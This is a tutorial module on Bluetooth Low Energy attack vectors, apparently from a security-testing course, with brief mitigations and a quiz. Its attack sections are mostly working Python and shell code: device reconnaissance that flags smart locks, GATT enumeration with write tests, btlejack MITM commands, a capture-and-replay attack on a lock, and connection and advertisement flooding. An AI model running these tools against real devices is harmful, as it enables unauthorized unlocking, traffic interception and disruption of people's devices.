# BLE Attack Vectors

## Overview

This module provides a comprehensive exploration of attack vectors targeting Bluetooth Low Energy systems. Understanding these attacks is essential for both offensive security testing and defensive security architecture.

## Table of Contents

1. [Attack Surface Overview](#attack-surface-overview)
2. [Reconnaissance Attacks](#reconnaissance-attacks)
3. [Man-in-the-Middle Attacks](#man-in-the-middle-attacks)
4. [Replay Attacks](#replay-attacks)
5. [Denial of Service](#denial-of-service)
6. [Key Extraction](#key-extraction)
7. [Injection Attacks](#injection-attacks)
8. [Privacy Attacks](#privacy-attacks)

## Attack Surface Overview

BLE systems present multiple attack surfaces across different layers:

```
Attack Surface Map
══════════════════════════════════════════════════════

Application Layer
├─ Logic Flaws
├─ Insecure Data Handling
├─ Weak Authorization
└─ Command Injection

GATT/ATT Layer
├─ Unauthorized Access
├─ Data Leakage
├─ Descriptor Attacks
└─ Attribute Fuzzing

Security Manager (SMP)
├─ Pairing Attacks
├─ Key Distribution Flaws
├─ Downgrade Attacks
└─ MITM during Pairing

Link Layer
├─ Connection Hijacking
├─ MAC Address Tracking
├─ Jamming
└─ Channel Hopping Attacks

Physical Layer
├─ Signal Interference
├─ Power Analysis
├─ Electromagnetic Analysis
└─ Fault Injection
```

## Reconnaissance Attacks

### Passive Scanning

**Objective**: Gather information without active interaction

**Tools Required**:
- nRF Connect for Mobile
- hcitool / bluetoothctl
- Ubertooth One (for packet capture)
- Wireshark with BTHCI

**Attack Steps**:

```bash
# 1. Discover BLE devices
sudo hcitool lescan

# 2. Get detailed information
sudo hcitool leinfo <MAC_ADDRESS>

# 3. Capture advertising packets
ubertooth-btle -f -A <MAC_ADDRESS>

# 4. Analyze in Wireshark
wireshark -i bluetooth0
```

**Information Gathered**:
- Device MAC addresses
- Device names
- Advertised services (UUIDs)
- Signal strength (RSSI)
- Manufacturer data
- Tx power levels
- Connection intervals

**Python Script for Automated Scanning**:

```python
from bluepy.btle import Scanner, DefaultDelegate
import time

class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
        self.devices_found = {}
    
    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            print(f"[+] New device discovered: {dev.addr}")
            self.devices_found[dev.addr] = {
                'rssi': dev.rssi,
                'connectable': dev.connectable,
                'addrType': dev.addrType
            }
            
            # Parse advertising data
            for (adtype, desc, value) in dev.getScanData():
                print(f"    {desc}: {value}")
                self.devices_found[dev.addr][desc] = value

def perform_ble_reconnaissance(duration=10):
    """Perform BLE reconnaissance for specified duration"""
    print(f"[*] Starting BLE reconnaissance for {duration} seconds...")
    
    scanner = Scanner().withDelegate(ScanDelegate())
    devices = scanner.scan(duration)
    
    print(f"\\n[+] Found {len(devices)} devices\\n")
    
    # Categorize devices
    locks = []
    fitness = []
    audio = []
    unknown = []
    
    for dev in devices:
        device_info = {
            'addr': dev.addr,
            'rssi': dev.rssi,
            'name': None,
            'services': []
        }
        
        for (adtype, desc, value) in dev.getScanData():
            if desc == "Complete Local Name" or desc == "Short Local Name":
                device_info['name'] = value
            elif desc == "Complete 128b Services":
                device_info['services'].append(value)
        
        # Categorize
        name_lower = (device_info['name'] or '').lower()
        if any(keyword in name_lower for keyword in ['lock', 'door', 'key']):
            locks.append(device_info)
        elif any(keyword in name_lower for keyword in ['fit', 'heart', 'watch']):
            fitness.append(device_info)
        elif any(keyword in name_lower for keyword in ['audio', 'headphone', 'speaker']):
            audio.append(device_info)
        else:
            unknown.append(device_info)
    
    # Print categorized results
    print("=== Potential Smart Locks ===")
    for device in locks:
        print(f"  {device['addr']} - {device['name']} (RSSI: {device['rssi']})")
    
    print("\\n=== Fitness Devices ===")
    for device in fitness:
        print(f"  {device['addr']} - {device['name']} (RSSI: {device['rssi']})")
    
    print("\\n=== Audio Devices ===")
    for device in audio:
        print(f"  {device['addr']} - {device['name']} (RSSI: {device['rssi']})")
    
    print("\\n=== Unknown Devices ===")
    for device in unknown:
        print(f"  {device['addr']} - {device['name']} (RSSI: {device['rssi']})")
    
    return {
        'locks': locks,
        'fitness': fitness,
        'audio': audio,
        'unknown': unknown
    }

if __name__ == "__main__":
    results = perform_ble_reconnaissance(duration=30)
```

### Active Enumeration

**Objective**: Connect and enumerate GATT services/characteristics

**Attack Steps**:

```python
from bluepy import btle
import time

class BLEEnumerator:
    def __init__(self, target_mac):
        self.target = target_mac
        self.device = None
        self.services = []
    
    def connect(self):
        """Connect to target device"""
        try:
            print(f"[*] Connecting to {self.target}...")
            self.device = btle.Peripheral(self.target)
            print("[+] Connected successfully")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def enumerate_all(self):
        """Enumerate all services and characteristics"""
        if not self.device:
            return
        
        print("\\n[*] Enumerating services...")
        services = self.device.getServices()
        
        for service in services:
            service_data = {
                'uuid': str(service.uuid),
                'handle_start': service.hndStart,
                'handle_end': service.hndEnd,
                'characteristics': []
            }
            
            print(f"\\n[Service] {service.uuid}")
            print(f"  Handle Range: 0x{service.hndStart:04x} - 0x{service.hndEnd:04x}")
            
            # Enumerate characteristics
            try:
                characteristics = service.getCharacteristics()
                for char in characteristics:
                    char_data = {
                        'uuid': str(char.uuid),
                        'handle': char.getHandle(),
                        'properties': char.propertiesToString(),
                        'value': None
                    }
                    
                    print(f"  [Characteristic] {char.uuid}")
                    print(f"    Handle: 0x{char.getHandle():04x}")
                    print(f"    Properties: {char.propertiesToString()}")
                    
                    # Try to read
                    if 'READ' in char.propertiesToString():
                        try:
                            value = char.read()
                            char_data['value'] = value
                            print(f"    Value (hex): {value.hex()}")
                            # Try ASCII decode
                            try:
                                ascii_val = value.decode('ascii')
                                print(f"    Value (ASCII): {ascii_val}")
                            except:
                                pass
                        except Exception as e:
                            print(f"    Read failed: {e}")
                    
                    # Check descriptors
                    try:
                        descriptors = char.getDescriptors()
                        if descriptors:
                            print(f"    Descriptors:")
                            for desc in descriptors:
                                print(f"      {desc.uuid} (Handle: 0x{desc.handle:04x})")
                    except:
                        pass
                    
                    service_data['characteristics'].append(char_data)
            
            except Exception as e:
                print(f"  [-] Error enumerating characteristics: {e}")
            
            self.services.append(service_data)
    
    def test_write_permissions(self):
        """Test which characteristics allow writing"""
        print("\\n[*] Testing write permissions...")
        
        writable_chars = []
        
        for service in self.device.getServices():
            for char in service.getCharacteristics():
                if 'WRITE' in char.propertiesToString():
                    print(f"\\n[Writable] {char.uuid}")
                    
                    # Test with safe data
                    test_payloads = [
                        b"\\x00",
                        b"\\x00\\x00\\x00\\x00",
                        b"TEST"
                    ]
                    
                    for payload in test_payloads:
                        try:
                            char.write(payload)
                            print(f"  ✓ Successfully wrote: {payload.hex()}")
                            writable_chars.append({
                                'uuid': str(char.uuid),
                                'handle': char.getHandle(),
                                'test_payload': payload.hex()
                            })
                            break
                        except Exception as e:
                            print(f"  ✗ Write failed: {e}")
        
        return writable_chars
    
    def disconnect(self):
        """Disconnect from device"""
        if self.device:
            self.device.disconnect()
            print("\\n[*] Disconnected")

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python ble_enum.py <MAC_ADDRESS>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    enumerator = BLEEnumerator(target)
    
    if enumerator.connect():
        enumerator.enumerate_all()
        writable = enumerator.test_write_permissions()
        enumerator.disconnect()
        
        # Summary
        print("\\n" + "="*50)
        print("ENUMERATION SUMMARY")
        print("="*50)
        print(f"Target: {target}")
        print(f"Services Found: {len(enumerator.services)}")
        print(f"Writable Characteristics: {len(writable)}")
        
        if writable:
            print("\\nPotential Attack Vectors:")
            for char in writable:
                print(f"  - {char['uuid']} (Handle: 0x{char['handle']:04x})")
```

## Man-in-the-Middle Attacks

### MITM During Pairing

**Vulnerability**: Legacy pairing or "Just Works" provides no MITM protection

**Requirements**:
- Two BLE adapters OR Ubertooth One
- btlejack or custom tools
- Target using weak pairing

**Attack Flow**:

```
Legitimate Device (A)     Attacker          Target Device (B)
         │                    │                      │
         │─── Pairing Req ───→│                      │
         │                    │─── Pairing Req ─────→│
         │                    │                      │
         │                    │←─── Pairing Resp ────│
         │←── Pairing Resp ───│                      │
         │                    │                      │
         │─── TK Exchange ───→│                      │
         │                    │─── TK Exchange ─────→│
         │                    │   (Intercepted!)     │
         │                    │                      │
         │─── Encrypted ─────→│─── Decrypted ───────→│
         │                    │    & Re-encrypted    │
```

**Using btlejack**:

```bash
# 1. Sniff for new connections
sudo btlejack -s

# 2. Follow specific connection
sudo btlejack -f 0x129

# 3. Wait for pairing
# btlejack will automatically attempt to crack TK

# 4. If successful, inject/intercept traffic
sudo btlejack -t -m "payload_here"
```

**Mitigation**:
- Use Secure Connections (BLE 4.2+)
- Implement Numeric Comparison pairing
- Require user confirmation

## Replay Attacks

### Capturing and Replaying Commands

**Scenario**: Smart lock that doesn't implement replay protection

**Attack Steps**:

**1. Capture Phase**:

```python
from bluepy import btle
import time
import pickle

class PacketCapture:
    def __init__(self, target_mac):
        self.target = target_mac
        self.captured = []
    
    def capture_session(self, duration=60):
        """Capture BLE traffic for analysis"""
        print(f"[*] Capturing traffic for {duration} seconds...")
        
        device = btle.Peripheral(self.target)
        
        # Subscribe to all notifications
        class NotificationDelegate(btle.DefaultDelegate):
            def __init__(self, capture_list):
                btle.DefaultDelegate.__init__(self)
                self.captures = capture_list
            
            def handleNotification(self, handle, data):
                timestamp = time.time()
                self.captures.append({
                    'time': timestamp,
                    'handle': handle,
                    'data': data,
                    'direction': 'notification'
                })
                print(f"[{timestamp}] RX Handle {hex(handle)}: {data.hex()}")
        
        delegate = NotificationDelegate(self.captured)
        device.setDelegate(delegate)
        
        # Enable notifications on all characteristics
        for service in device.getServices():
            for char in service.getCharacteristics():
                if 'NOTIFY' in char.propertiesToString():
                    try:
                        # Enable notifications
                        setup_data = b"\\x01\\x00"
                        cccd = char.getDescriptors(forUUID=0x2902)[0]
                        cccd.write(setup_data, withResponse=True)
                        print(f"[+] Enabled notifications for {char.uuid}")
                    except:
                        pass
        
        # Capture for duration
        start = time.time()
        while time.time() - start < duration:
            device.waitForNotifications(1.0)
        
        device.disconnect()
        
        # Save captured data
        with open('captured_traffic.pkl', 'wb') as f:
            pickle.dump(self.captured, f)
        
        print(f"[+] Captured {len(self.captured)} packets")
        print("[+] Saved to captured_traffic.pkl")
        
        return self.captured

# Capture during legitimate unlock
capturer = PacketCapture("AA:BB:CC:DD:EE:FF")
capturer.capture_session(120)  # Capture for 2 minutes
```

**2. Analysis Phase**:

```python
import pickle

def analyze_captured_traffic(capture_file='captured_traffic.pkl'):
    """Analyze captured traffic for patterns"""
    
    with open(capture_file, 'rb') as f:
        captures = pickle.load(f)
    
    print(f"[*] Analyzing {len(captures)} captured packets...\\n")
    
    # Group by handle
    by_handle = {}
    for packet in captures:
        handle = packet['handle']
        if handle not in by_handle:
            by_handle[handle] = []
        by_handle[handle].append(packet)
    
    # Analyze each handle
    for handle, packets in by_handle.items():
        print(f"[Handle 0x{handle:04x}] {len(packets)} packets")
        
        # Check for static patterns
        unique_payloads = set([p['data'].hex() for p in packets])
        
        if len(unique_payloads) == 1:
            print(f"  ⚠ STATIC PAYLOAD: {list(unique_payloads)[0]}")
            print(f"  → Likely vulnerable to replay!")
        elif len(unique_payloads) < len(packets) / 2:
            print(f"  ⚠ Limited unique payloads: {len(unique_payloads)}")
            print(f"  → May be vulnerable to replay")
        else:
            print(f"  ✓ Diverse payloads: {len(unique_payloads)}")
        
        # Show sample payloads
        print(f"  Sample payloads:")
        for payload_hex in list(unique_payloads)[:5]:
            print(f"    {payload_hex}")
        
        print()

analyze_captured_traffic()
```

**3. Replay Phase**:

```python
import pickle

def replay_attack(capture_file='captured_traffic.pkl', target_mac=None):
    """Replay captured traffic"""
    
    with open(capture_file, 'rb') as f:
        captures = pickle.load(f)
    
    print("[*] Replaying captured traffic...")
    
    device = btle.Peripheral(target_mac)
    
    for packet in captures:
        try:
            # Find characteristic by handle
            char = device.getCharacteristics(handle=packet['handle'])[0]
            
            # Replay the packet
            char.write(packet['data'], withResponse=False)
            print(f"[→] Replayed: {packet['data'].hex()}")
            
            # Maintain original timing
            if len(captures) > 1:
                # Calculate delay to next packet
                idx = captures.index(packet)
                if idx < len(captures) - 1:
                    next_packet = captures[idx + 1]
                    delay = next_packet['time'] - packet['time']
                    time.sleep(delay)
        
        except Exception as e:
            print(f"[-] Replay failed: {e}")
    
    device.disconnect()
    print("[+] Replay complete")

# Attempt replay
replay_attack(target_mac="AA:BB:CC:DD:EE:FF")
```

**Defense**: Implement nonces, timestamps, or counters in application protocol

## Denial of Service

### Connection Flooding

**Attack**: Exhaust device's connection slots

```python
import threading
from bluepy import btle
import time

def connection_flood_attack(target_mac, num_threads=10):
    """Flood target with connection attempts"""
    
    def connect_loop(target, thread_id):
        while True:
            try:
                print(f"[Thread {thread_id}] Connecting...")
                device = btle.Peripheral(target)
                time.sleep(1)  # Hold connection
                device.disconnect()
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
            time.sleep(0.1)
    
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=connect_loop, args=(target_mac, i))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Run for specified duration
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\\n[*] Stopping attack...")

# ⚠️ Only use on authorized targets!
# connection_flood_attack("AA:BB:CC:DD:EE:FF")
```

**Impact**:
- Legitimate users cannot connect
- Device may crash or reboot
- Battery drain

### Advertisement Flooding

**Attack**: Flood area with BLE advertisements

```python
# Requires Linux with BlueZ and admin privileges

import subprocess
import time

def advertisement_flood(duration=60):
    """
    Create multiple virtual BLE advertisers
    Floods the BLE spectrum with advertisements
    """
    
    # Set up multiple advertising instances
    advertisers = []
    
    for i in range(10):
        adv_data = f"TEST{i:02d}"
        
        # Create advertiser using hcitool
        cmd = [
            'sudo', 'hcitool', '-i', 'hci0', 'cmd',
            '0x08', '0x0008',  # LE Set Advertising Data
            f'{len(adv_data)+1:02x}',  # Length
            '0x09',  # Complete Local Name
            *[f'{ord(c):02x}' for c in adv_data]
        ]
        
        subprocess.run(cmd)
        time.sleep(0.1)
    
    # Enable advertising
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'leadv', '3'])
    
    print(f"[*] Advertisement flood active for {duration} seconds")
    time.sleep(duration)
    
    # Disable advertising
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'noleadv'])
    print("[+] Attack stopped")

# advertisement_flood(60)
```

**Impact**:
- Legitimate devices have trouble discovering target
- Radio spectrum congestion
- Scanning becomes unreliable

## Quiz

1. What information can be gathered from passive BLE scanning?
2. Why is "Just Works" pairing vulnerable to MITM attacks?
3. How can replay attacks be prevented in BLE applications?
4. Describe three types of DoS attacks against BLE devices.
5. What is the difference between active and passive reconnaissance?
6. How does btlejack perform MITM attacks?
7. What defensive measures can protect against connection flooding?
8. Why is GATT enumeration important for security testing?

## Next Steps

- [Practical Testing: HID Barcode Scanner →](04-hid-scanner-pentesting.md)
- [Hands-On: Exercise 2 - BLE Reconnaissance →](exercises/ex02-ble-reconnaissance.md)

## Resources

- [btlejack Documentation](https://github.com/virtualabs/btlejack)
- [Ubertooth One Usage Guide](https://github.com/greatscottgadgets/ubertooth/wiki)
- [Bluetooth Security Papers](https://www.bluetooth.com/learn-about-bluetooth/bluetooth-technology/security/)

---

[← Back: Bluetooth HID Protocol](02-bluetooth-hid-protocol.md) | [Next: HID Scanner Pentesting →](04-hid-scanner-pentesting.md)
